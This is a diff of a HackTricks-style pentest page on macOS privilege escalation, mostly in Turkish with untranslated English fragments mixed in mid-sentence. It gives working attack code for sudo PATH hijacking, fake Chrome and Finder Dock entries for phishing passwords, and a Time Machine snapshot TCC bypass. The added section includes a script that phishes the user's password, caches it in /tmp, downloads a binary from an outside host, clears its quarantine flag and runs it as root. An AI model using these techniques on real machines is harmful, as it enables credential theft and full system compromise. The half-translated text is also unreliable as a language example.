@@ -1,10 +1,11 @@
-# macOS Yetki Yükseltme
+# macOS Privilege Escalation
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TCC Yetki Yükseltme
+## TCC Privilege Escalation
 
-Eğer buraya TCC yetki yükseltme arayışıyla geldiyseniz, şu adrese gidin:
+If you came here looking for TCC privilege escalation go to:
+
 
 {{#ref}}
 macos-security-protections/macos-tcc/
@@ -12,7 +13,8 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Lütfen **yetki yükseltme ile ilgili çoğu numaranın Linux/Unix'i etkilediği gibi MacOS** makinelerini de etkileyeceğini unutmayın. Bu yüzden:
+Lütfen unutmayın ki **Linux/Unix'i etkileyen privilege escalation ile ilgili hilelerin çoğu** aynı zamanda MacOS makinelerini de etkiler. Bu yüzden bakın:
+
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
@@ -20,11 +22,11 @@ Lütfen **yetki yükseltme ile ilgili çoğu numaranın Linux/Unix'i etkilediği
 
 ## Kullanıcı Etkileşimi
 
-### Sudo Ele Geçirme
+### Sudo Hijacking
 
-Orijinal [Sudo Ele Geçirme tekniğini Linux Yetki Yükseltme yazısında bulabilirsiniz](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Orijinal [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) içinde bulabilirsiniz.
 
-Ancak, macOS **kullanıcının** **`PATH`**'ini **`sudo`** komutunu çalıştırdığında **korur**. Bu da, bu saldırıyı gerçekleştirmenin başka bir yolunun, mağdurun **sudo** çalıştırırken hala çalıştıracağı **diğer ikili dosyaları ele geçirmek** olabileceği anlamına gelir:
+Ancak, macOS kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`**'ini **korur**. Bu da bu saldırıyı gerçekleştirmenin başka bir yolunun, mağdurun **sudo çalıştırırken** çalıştıracağı başka ikili dosyaları **hijack other binaries** olması anlamına gelir:
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -39,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Not edin ki terminal kullanan bir kullanıcının **Homebrew yüklü olma olasılığı yüksektir**. Bu nedenle **`/opt/homebrew/bin`** içindeki ikili dosyaları ele geçirmek mümkündür.
+Note that a user that uses the terminal will highly probable have **Homebrew yüklü**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
 
-### Dock Taklidi
+### Dock Impersonation
 
-Bazı **sosyal mühendislik** yöntemleri kullanarak dock içinde **örneğin Google Chrome'u taklit edebilir** ve aslında kendi scriptinizi çalıştırabilirsiniz:
+Birkaç **social engineering** kullanarak örneğin Dock içinde **Google Chrome**'u taklit edebilir ve aslında kendi script'inizi çalıştırabilirsiniz:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Bazı öneriler:
 
-- Dock'ta bir Chrome olup olmadığını kontrol edin, bu durumda o girişi **kaldırın** ve Dock dizisinde **aynı konuma** **sahte** **Chrome girişini ekleyin**.
+- Dock'ta Chrome olup olmadığını kontrol edin ve eğer varsa o girdiyi **kaldırın** ve Dock dizisinde aynı pozisyona **sahte** **Chrome girdisini ekleyin**.
 ```bash
 #!/bin/sh
 
@@ -124,11 +126,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Bazı öneriler:
 
-- Dock'tan Finder'ı **kaldıramazsınız**, bu yüzden eğer Dock'a ekleyecekseniz, sahte Finder'ı gerçek olanın hemen yanına koyabilirsiniz. Bunun için **sahte Finder girişini Dock dizisinin başına eklemeniz** gerekiyor.
-- Diğer bir seçenek, Dock'a yerleştirmemek ve sadece açmaktır; "Finder'ın Finder'ı kontrol etmesi için izin istemesi" o kadar da garip değil.
-- Şifreyi korkunç bir kutu ile sormadan **root'a yükselmek** için başka bir seçenek, Finder'ın gerçekten bir ayrıcalıklı işlem gerçekleştirmek için şifre istemesini sağlamaktır:
-- Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Şifre isteyen istem, "Finder sudo'yu kopyalamak istiyor" diye belirtecektir)
-- Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol edebilirsiniz, böylece şifre isteyen istem "Finder Finder.bundle'ı kopyalamak istiyor" diye belirtecektir)
+- **Dock'tan Finder'ı kaldıramazsınız**, bu yüzden Dock'a ekleyecekseniz, sahte Finder'ı gerçek olanın hemen yanına koyabilirsiniz. Bunun için **Dock dizisinin başına sahte Finder girdisini eklemeniz gerekir**.
+- Diğer bir seçenek, bunu Dock'a koymamak ve sadece açmaktır; "Finder asking to control Finder" o kadar garip değildir.
+- Parolayı sormadan çirkin bir kutu ile **escalate to root without asking** yapmak yerine, Finder'ın gerçekten ayrıcalıklı bir işlem yapmak için parolayı sormasını sağlayın:
+- Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parolayı isteyen istem, "Finder wants to copy sudo" diye gösterecektir)
+- Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol edebilirsiniz; böylece parolayı isteyen istem "Finder wants to copy Finder.bundle" diye gösterecektir)
 ```bash
 #!/bin/sh
 
@@ -201,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Root Yetki Yükseltme
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - mount_apfs TCC atlatma ve yetki yükseltme
+Malware frequently abuses user interaction to **sudo yetkisi olan bir parolayı yakalar** ve bunu programatik olarak yeniden kullanır. Yaygın bir akış:
 
-**Herhangi bir kullanıcı** (hatta yetkisiz olanlar bile) bir zaman makinesi anlık görüntüsü oluşturabilir ve bunu monte edebilir, **o anlık görüntünün TÜM dosyalarına** erişebilir.\
-Gerekli olan **tek yetki**, kullanılan uygulamanın (örneğin `Terminal`) **Tam Disk Erişimi** (FDA) erişimine sahip olmasıdır (`kTCCServiceSystemPolicyAllfiles`), bu da bir yönetici tarafından verilmelidir.
+1. Giriş yapmış kullanıcıyı `whoami` ile belirleyin.
+2. **Parola istemlerini döngüye alın**; `dscl . -authonly "$user" "$pw"` başarılı dönene kadar.
+3. Kimlik bilgilerini önbelleğe alın (ör. `/tmp/.pass`) ve ayrıcalıklı işlemleri `sudo -S` ile çalıştırın (parola stdin üzerinden).
+
+Örnek minimal zincir:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+Çalınan parola daha sonra **Gatekeeper karantinasını `xattr -c` ile temizlemek**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşimsiz olarak çalıştırmak için yeniden kullanılabilir.
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Herhangi bir kullanıcı** (hatta ayrıcalıksız olanlar bile) time machine snapshot oluşturup bağlayabilir ve bu anlık görüntünün **TÜM dosyalarına erişebilir**.\
+**Tek gerekli ayrıcalık**, kullanılan uygulamanın (örn. `Terminal`) **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır; bu erişim bir admin tarafından verilmelidir.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -226,15 +249,19 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Daha ayrıntılı bir açıklama [**orijinal raporda**](https://theevilbit.github.io/posts/cve_2020_9771/)** bulunabilir.**
+Daha ayrıntılı bir açıklama [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## Hassas Bilgiler
 
-Bu, ayrıcalıkları artırmak için faydalı olabilir:
+Bu, ayrıcalıkları yükseltmek için faydalı olabilir:
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## Referanslar
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
